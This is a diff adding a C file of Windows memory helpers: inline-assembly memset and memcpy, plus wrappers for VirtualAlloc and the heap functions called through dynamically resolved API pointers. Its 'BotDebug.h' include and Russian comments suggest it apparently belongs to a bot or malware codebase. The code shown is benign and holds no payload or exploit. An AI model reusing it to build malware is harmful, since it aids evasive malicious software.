@@ -1,0 +1,259 @@
+#include <windows.h>
+
+#include "GetApi.h"
+#include "Utils.h"
+#include "ntdll.h"
+
+#include "BotDebug.h"
+
+void *m_memset( void *szBuffer, DWORD dwSym, DWORD dwLen )
+{
+	if ( !szBuffer )
+	{
+		return NULL;
+	}
+
+	__asm
+	{
+		pushad
+		mov		edi,[szBuffer]
+		mov		ecx,[dwLen]
+		mov		eax,[dwSym]
+		rep		stosb
+		popad
+	} 
+
+	return NULL;
+} 
+
+void *m_memcpy( void *szBuf, const void *szStr, int nLen )
+{
+	if ( !szBuf || !szStr || nLen <= 0 )
+		return NULL;
+
+	__asm
+	{
+		pushad
+		mov		esi,[szStr]
+		mov		edi,[szBuf]
+		mov		ecx,[nLen]
+		rep		movsb
+		popad
+	}
+
+	return NULL;
+} 
+
+
+int m_memcmp( const void *buf1, const void *buf2, size_t count )
+{
+	if ( !buf1 || !buf2 )
+	{
+		return -1;
+	}
+
+	unsigned char *p1 = (unsigned char *)buf1;
+	unsigned char *p2 = (unsigned char *)buf2;
+
+	int   rc = 0;
+
+	for ( size_t i = 0; i < count; i++ )
+	{
+		if( *p1 < *p2 )
+		{
+			rc = -1;
+			break;
+		}
+
+		if( *p1 > *p2 )
+		{
+			rc = 1;
+			break;
+		}
+
+		p1++;
+		p2++;
+	}
+
+	return rc;
+}
+
+
+
+DWORD GetMemSize( LPVOID lpAddr )
+{
+	if ( !lpAddr )
+	{
+		return 0;
+	}
+
+	MEMORY_BASIC_INFORMATION MemInfo;
+
+	pVirtualQuery( lpAddr, &MemInfo, sizeof( MEMORY_BASIC_INFORMATION ) );
+
+	return MemInfo.RegionSize;
+}
+
+
+VOID MemFree( LPVOID lpAddr )
+{
+	if ( lpAddr != NULL )
+		pVirtualFree( lpAddr, 0, MEM_RELEASE );
+}
+
+
+LPVOID MemAlloc( DWORD dwSize )
+{
+	return pVirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
+}
+
+LPVOID MemAllocAndClear(DWORD Size)
+{
+	// Выделить и очистить память указанного размера
+	if (Size == 0)
+    	return NULL;
+
+	void* Memory = pVirtualAlloc(0, Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	m_memset(Memory, 0, Size);
+
+	//if (Memory != NULL)
+	//{
+ //   	DWORD Symbol = 0;
+	//	__asm
+	//	{
+	//		pushad
+	//		mov		edi, [Memory]
+	//		mov		ecx, [Size]
+	//		mov		eax, [Symbol]
+	//		rep		stosb
+	//		popad
+	//	}
+ //   }
+
+	return Memory;
+}
+
+
+
+LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize )
+{
+    // Изменяем размер выделенного буфера памяти
+	DWORD PrevLen = 0;
+
+	// Определяем размер предыдущего блока
+	if ( lpAddr )
+		PrevLen = GetMemSize(lpAddr);
+
+	//  Создаём новый буфер
+	LPVOID NewAddr = NULL;
+	if (dwSize > 0)
+	{
+		NewAddr = MemAlloc(dwSize);
+		if (lpAddr && NewAddr && PrevLen)
+		{
+            // Копируем старую память
+			if (dwSize < PrevLen)
+            	PrevLen = dwSize;
+			m_memcpy(NewAddr, lpAddr, PrevLen);
+		}
+	}
+
+	if (lpAddr != NULL)
+		MemFree(lpAddr);
+
+	return NewAddr;
+}
+
+//-----------------------------------------------------------------------------
+
+#define HeapFlags HEAP_ZERO_MEMORY
+
+LPVOID MemHeapAlloc(DWORD Size)
+{
+	if (Size == 0)
+		return 0;
+	HANDLE Heap = pGetProcessHeap();
+	if (Heap != 0)
+		return pHeapAlloc(Heap, HeapFlags, Size);
+	else
+		return NULL;
+}
+
+LPVOID MemHeapReAlloc(LPVOID Buf, DWORD Size)
+{
+	// Переопределяем блок памяти
+
+	if (Buf == NULL)
+		return MemHeapAlloc(Size);
+
+	HANDLE Heap = pGetProcessHeap();
+	if (Heap != NULL)
+	{
+		LPVOID Res = pHeapReAlloc(Heap, HeapFlags, Buf, Size);
+		#ifdef DebugUtils
+			if (Res == NULL)
+				DebugMessageEx("Memory", 10, "MemHeapReAlloc", NULL, "Ошибка перевыделения памяти ");
+		#endif
+		return Res;
+    }
+	else
+		return NULL;
+
+}
+
+bool MemHeapReAlloc2(LPVOID &Buf, DWORD Size)
+{
+	LPVOID NewBuf = MemHeapReAlloc(Buf, Size);
+	if (NewBuf != NULL)
+	{
+		Buf = NewBuf;
+		return true;
+	}
+	else
+		return false;
+}
+
+
+void MemHeapFree(LPVOID Buf)
+{
+    // Освобождаем выделенную память
+	if (Buf == NULL)
+		return;
+
+	HANDLE Heap = pGetProcessHeap();
+	if (Heap != 0)
+	{
+		BOOL V = (BOOL)pHeapFree(Heap, HeapFlags, Buf);
+		#ifdef DebugUtils
+			if (!V)
+				DebugMessageEx("Memory", 10, "MemHeapFree", NULL, "Ошибка освобождения памяти ");
+		#endif
+    }
+}
+
+void MemHeapFree2(LPVOID &Buf)
+{
+	// Освободить память и обнулить переменную
+	if (Buf != NULL)
+	{
+		MemHeapFree(Buf);
+		Buf = NULL;
+	}
+}
+
+DWORD MemHeapSize(LPVOID Buf)
+{
+	if (Buf == NULL)
+		return 0;
+	HANDLE Heap = pGetProcessHeap();
+
+	if (Heap != 0)
+	{
+		int S = (int)pHeapSize(Heap, 0, Buf);
+		if (S < 0)
+			S = 0;
+        return S;
+	}
+	else
+		return 0;
+}
